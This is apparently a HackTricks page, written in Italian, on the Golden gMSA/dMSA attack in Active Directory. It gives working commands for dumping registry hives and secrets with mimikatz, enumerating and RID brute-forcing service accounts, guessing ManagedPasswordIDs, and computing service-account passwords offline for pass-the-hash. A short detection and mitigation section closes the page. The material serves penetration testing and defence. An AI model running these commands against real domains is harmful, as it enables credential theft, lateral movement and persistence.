# Golden gMSA/dMSA Attack (Derivazione offline delle password degli account di servizio gestiti)

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Gli account Windows Managed Service Account (MSA) sono principal speciali progettati per eseguire servizi senza dover gestire manualmente le password.
Esistono due varianti principali:

1. **gMSA** – group Managed Service Account – può essere utilizzato su più host autorizzati nel relativo attributo `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – il successore (in preview) di gMSA, che utilizza la stessa crittografia ma consente scenari di delega più granulari.

Per entrambe le varianti, la **password non viene memorizzata** su ogni Domain Controller (DC) come un normale NT-hash. Invece, ogni DC può **derivare** la password attuale on-the-fly da:

* La **KDS Root Key** a livello di foresta (`KRBTGT\KDS`) – secret con nome GUID generato casualmente, replicato su ogni DC nel container `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Il **SID** dell'account target.
* Un **ManagedPasswordID** (GUID) specifico dell'account, presente nell'attributo `msDS-ManagedPasswordId`.

La derivazione è: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob di 240 byte infine **codificato in base64** e memorizzato nell'attributo `msDS-ManagedPassword`.
Durante il normale utilizzo della password non è necessario alcun traffico Kerberos o interazione con il dominio: un host membro deriva localmente la password, purché conosca i tre input.

## Golden gMSA / Golden dMSA Attack

Se un attacker riesce a ottenere tutti e tre gli input **offline**, può calcolare password **attuali e future valide** per qualsiasi gMSA/dMSA nella foresta senza contattare nuovamente il DC, eludendo:<sup>[[1]](#references)[[2]](#references)</sup>

* L'auditing delle letture LDAP
* Gli intervalli di modifica delle password (può precalcolarle)

Questo è analogo a un *Golden Ticket* per gli account di servizio.<sup>[[1]](#references)[[2]](#references)</sup>

### Prerequisiti

1. **Compromissione a livello di foresta** di **un** DC (o Enterprise Admin), oppure accesso `SYSTEM` a uno dei DC nella foresta.
2. Possibilità di enumerare gli account di servizio (lettura LDAP / RID brute-force).
3. Workstation .NET ≥ 4.7.2 x64 per eseguire [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) o codice equivalente.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Fase 1 – Estrazione della KDS Root Key

Effettuare il dump da qualsiasi DC (Volume Shadow Copy / hive SAM+SECURITY raw o secrets remoti):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
La stringa base64 denominata `RootKey` (nome GUID) è necessaria nei passaggi successivi.<sup>[[1]](#references)[[2]](#references)</sup>

##### Fase 2 – Enumerare gli oggetti gMSA / dMSA

Recuperare almeno `sAMAccountName`, `objectSid` e `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementa modalità di supporto:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Fase 3 – Guess / Discover del ManagedPasswordID (quando manca)

Alcuni deployment *rimuovono* `msDS-ManagedPasswordId` dalle letture protette da ACL.
Poiché il GUID è di 128 bit, il bruteforce ingenuo è impraticabile, ma:

1. I primi **32 bit = tempo Unix epoch** della creazione dell'account (con risoluzione al minuto).
2. Seguono 96 bit casuali.

Pertanto, una **wordlist ristretta per account** (± poche ore) è realistica.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Lo strumento calcola le password candidate e confronta il relativo blob base64 con l'attributo `msDS-ManagedPassword` reale: la corrispondenza rivela il GUID corretto.

##### Fase 4 – Calcolo e conversione offline della password

Una volta noto il ManagedPasswordID, la password valida è a un comando di distanza:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Gli hash risultanti possono essere iniettati con **mimikatz** (`sekurlsa::pth`) o **Rubeus** per l'abuso di Kerberos, consentendo **lateral movement** e **persistence** furtivi.

## Rilevamento e mitigazione

* Limita le funzionalità di **backup dei DC e lettura degli hive del registro** agli amministratori Tier-0.
* Monitora la creazione della **Directory Services Restore Mode (DSRM)** o delle **Volume Shadow Copy** sui DC.
* Esegui l'audit delle letture / modifiche a `CN=Master Root Keys,…` e dei flag `userAccountControl` degli account di servizio.
* Rileva scritture insolite di password **base64** o il riutilizzo improvviso della password di un servizio tra gli host.
* Valuta la conversione dei gMSA con privilegi elevati in **account di servizio classici**, con rotazioni casuali regolari, quando l'isolamento Tier-0 non è possibile.

## Strumenti

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementazione di riferimento utilizzata in questa pagina.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementazione di riferimento utilizzata in questa pagina.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket utilizzando chiavi AES derivate.

## Riferimenti

- [1] [Golden dMSA – bypass dell'autenticazione per gli Account di servizio gestiti delegati](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [Account d'attacco gMSA Active Directory](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Repository GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
